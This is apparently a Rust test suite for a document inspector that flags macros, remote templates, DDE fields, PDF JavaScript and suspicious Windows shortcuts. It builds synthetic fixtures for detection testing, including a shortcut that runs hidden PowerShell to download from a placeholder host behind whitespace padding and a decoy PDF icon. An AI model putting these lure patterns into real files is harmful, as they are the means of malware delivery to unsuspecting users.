//! Synthetic, harmless fixtures for document inspection. None of them contain
//! working macros, scripts or payloads; they only carry the structures that
//! the inspector recognizes.

use std::io::{Cursor, Write};

use zip::write::SimpleFileOptions;

use super::{inspect_lnk, inspect_ole, inspect_ooxml, inspect_pdf, is_lnk, is_ole, is_pdf};

fn zip_with(entries: &[(&str, &[u8])]) -> Vec<u8> {
    let mut writer = zip::ZipWriter::new(Cursor::new(Vec::new()));
    for (name, data) in entries {
        writer
            .start_file(*name, SimpleFileOptions::default())
            .expect("start entry");
        writer.write_all(data).expect("write entry");
    }
    writer.finish().expect("finish zip").into_inner()
}

#[test]
fn ooxml_reports_macros_remote_templates_and_dde() {
    let rels = br#"<?xml version="1.0"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
    Target="http://templates.example.test/t.dotm?a=1&amp;b=2" TargetMode="External"/>
  <Relationship Id="rId2" TargetMode="External" Target="https://docs.example.test/help"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"/>
  <Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles"
    Target="styles.xml"/>
</Relationships>"#;
    let document = br#"<w:document><w:body><w:p><w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\x "y" </w:instrText></w:r></w:p></w:body></w:document>"#;
    let package = zip_with(&[
        ("[Content_Types].xml", b"<Types/>"),
        ("word/document.xml", document),
        ("word/_rels/settings.xml.rels", rels),
        ("word/vbaProject.bin", b"not a real macro project"),
        ("word/embeddings/oleObject1.bin", b"placeholder"),
    ]);

    let report = inspect_ooxml(&package).expect("OOXML package");
    assert_eq!(report.kind, "Word document (OOXML)");
    assert_eq!(report.macros_present, Some(true));
    let targets = report
        .external_targets
        .iter()
        .map(|target| (target.relationship.as_str(), target.target.as_str()))
        .collect::<Vec<_>>();
    assert_eq!(
        targets,
        [
            (
                "attachedTemplate",
                "http://templates.example.test/t.dotm?a=1&b=2"
            ),
            ("hyperlink", "https://docs.example.test/help"),
        ]
    );
    let notes = report.suspicious_properties.join("\n");
    assert!(notes.contains("VBA macro project"), "{notes}");
    assert!(notes.contains("remote template reference: http://templates.example.test/t.dotm"));
    assert!(notes.contains("DDE field instruction in word/document.xml"));
    assert!(notes.contains("embeds 1 OLE/package object"));
    assert!(
        !notes.contains("docs.example.test"),
        "hyperlinks are not suspicious"
    );
    assert!(
        report
            .analysis_text()
            .contains("http://templates.example.test/")
    );
}

#[test]
fn plain_zip_is_not_ooxml() {
    assert!(inspect_ooxml(&zip_with(&[("readme.txt", b"hello")])).is_none());
    assert!(inspect_ooxml(b"PK\x03\x04 truncated").is_none());
}

fn ole_fixture(names: &[(&str, u8)]) -> Vec<u8> {
    const SECTOR: usize = 512;
    let mut file = vec![0_u8; SECTOR * 3];
    file[..8].copy_from_slice(&[0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1]);
    file[0x1E..0x20].copy_from_slice(&9_u16.to_le_bytes());
    file[0x2C..0x30].copy_from_slice(&1_u32.to_le_bytes()); // one FAT sector
    file[0x30..0x34].copy_from_slice(&1_u32.to_le_bytes()); // directory at sector 1
    file[0x4C..0x50].copy_from_slice(&0_u32.to_le_bytes()); // FAT at sector 0
    for slot in 1..109 {
        let offset = 0x4C + slot * 4;
        file[offset..offset + 4].copy_from_slice(&u32::MAX.to_le_bytes());
    }
    // Sector 0 (file offset 512): FAT. Sector 0 is a FAT sector, 1 ends the chain.
    let fat = SECTOR;
    file[fat..fat + 4].copy_from_slice(&0xFFFF_FFFD_u32.to_le_bytes());
    file[fat + 4..fat + 8].copy_from_slice(&0xFFFF_FFFE_u32.to_le_bytes());
    // Sector 1 (file offset 1024): four 128-byte directory entries.
    let directory = SECTOR * 2;
    for (index, (name, kind)) in names.iter().enumerate().take(4) {
        let entry = directory + index * 128;
        let encoded = name
            .encode_utf16()
            .chain([0])
            .flat_map(u16::to_le_bytes)
            .collect::<Vec<_>>();
        file[entry..entry + encoded.len()].copy_from_slice(&encoded);
        file[entry + 0x40..entry + 0x42].copy_from_slice(&(encoded.len() as u16).to_le_bytes());
        file[entry + 0x42] = *kind;
    }
    file
}

#[test]
fn ole_directory_reveals_document_type_and_macro_storage() {
    let file = ole_fixture(&[
        ("Root Entry", 5),
        ("WordDocument", 2),
        ("Macros", 1),
        ("\u{1}Ole10Native", 2),
    ]);
    assert!(is_ole(&file));
    let report = inspect_ole(&file);
    assert_eq!(report.kind, "Word 97-2003 document (OLE)");
    assert_eq!(report.macros_present, Some(true));
    let notes = report.suspicious_properties.join("\n");
    assert!(notes.contains("VBA macro storage"));
    assert!(notes.contains("Ole10Native"));
    assert!(
        report
            .notes
            .iter()
            .all(|note| !note.contains("could not be parsed"))
    );
}

#[test]
fn damaged_ole_falls_back_to_a_bounded_name_scan() {
    let mut file = ole_fixture(&[("Root Entry", 5), ("Workbook", 2), ("_VBA_PROJECT_CUR", 1)]);
    file[0x30..0x34].copy_from_slice(&999_u32.to_le_bytes()); // directory outside the file
    let report = inspect_ole(&file);
    assert_eq!(report.kind, "Excel 97-2003 workbook (OLE)");
    assert_eq!(report.macros_present, Some(true));
    assert!(
        report
            .notes
            .iter()
            .any(|note| note.contains("could not be parsed"))
    );

    // A truncated header must not panic either.
    let report = inspect_ole(&file[..64]);
    assert_eq!(report.macros_present, Some(false));
}

#[test]
fn pdf_counts_actions_decodes_obfuscated_names_and_extracts_uris() {
    let pdf = b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog /OpenAction 2 0 R /Names << /J#61vaScript 3 0 R >> >>\nendobj\n\
2 0 obj << /S /URI /URI (http://pdf.example.test/a\\)b) >> endobj\n\
3 0 obj << /S /JavaScript /JS (app.alert\\(1\\)) >> endobj\n%%EOF";
    assert!(is_pdf(pdf));
    let report = inspect_pdf(pdf);
    let property = |name: &str| {
        report
            .properties
            .iter()
            .find(|property| property.name == name)
            .map(|property| property.value.as_str())
    };
    assert_eq!(property("/JavaScript"), Some("2"));
    assert_eq!(property("/OpenAction"), Some("1"));
    assert_eq!(
        report.external_targets[0].target,
        "http://pdf.example.test/a)b"
    );
    let notes = report.suspicious_properties.join("\n");
    assert!(notes.contains("PDF contains JavaScript"));
    assert!(notes.contains("automatic actions"));
    assert!(notes.contains("#xx hex escapes"));
    // The signature must appear within the first 1024 bytes.
    let mut late = vec![b'a'; 2_000];
    late.extend_from_slice(b"%PDF-1.7");
    assert!(!is_pdf(&late));
}

fn lnk_string(value: &str) -> Vec<u8> {
    let units = value.encode_utf16().collect::<Vec<_>>();
    let mut output = (units.len() as u16).to_le_bytes().to_vec();
    output.extend(units.iter().flat_map(|unit| unit.to_le_bytes()));
    output
}

#[test]
fn lnk_reports_script_hosts_padding_hidden_windows_and_decoy_icons() {
    // HasRelativePath | HasArguments | HasIconLocation | IsUnicode
    let flags: u32 = 0x8 | 0x20 | 0x40 | 0x80;
    let mut file = vec![0_u8; 0x4C];
    file[..4].copy_from_slice(&0x4C_u32.to_le_bytes());
    file[4..20].copy_from_slice(&super::LNK_CLSID);
    file[0x14..0x18].copy_from_slice(&flags.to_le_bytes());
    file[0x3C..0x40].copy_from_slice(&7_u32.to_le_bytes());
    // Target created 2023-11-14T22:13:20Z (FILETIME); access time left unset.
    file[0x1C..0x24].copy_from_slice(&133_444_736_000_000_000_u64.to_le_bytes());
    file.extend(lnk_string(
        r"..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    ));
    let arguments = format!(
        "{}-nop -w hidden -c iwr http://lnk.example.test/p",
        " ".repeat(40)
    );
    file.extend(lnk_string(&arguments));
    file.extend(lnk_string(r"C:\Users\Public\invoice.pdf"));

    assert!(is_lnk(&file));
    let report = inspect_lnk(&file).expect("valid shortcut");
    let notes = report.suspicious_properties.join("\n");
    assert!(
        notes.contains("script host or system binary: powershell"),
        "{notes}"
    );
    assert!(notes.contains("start with 40 whitespace characters"));
    assert!(notes.contains("minimized"));
    assert!(notes.contains("document-like icon"));
    assert!(report.analysis_text().contains("http://lnk.example.test/p"));
    let time = |name: &str| {
        report
            .properties
            .iter()
            .find(|property| property.name == name)
            .map(|property| property.value.as_str())
    };
    assert_eq!(time("Target created (UTC)"), Some("2023-11-14T22:13:20Z"));
    assert_eq!(time("Target accessed (UTC)"), None);

    // Declared strings that run past the end of the file are errors, not panics.
    assert!(inspect_lnk(&file[..file.len() - 10]).is_err());
}
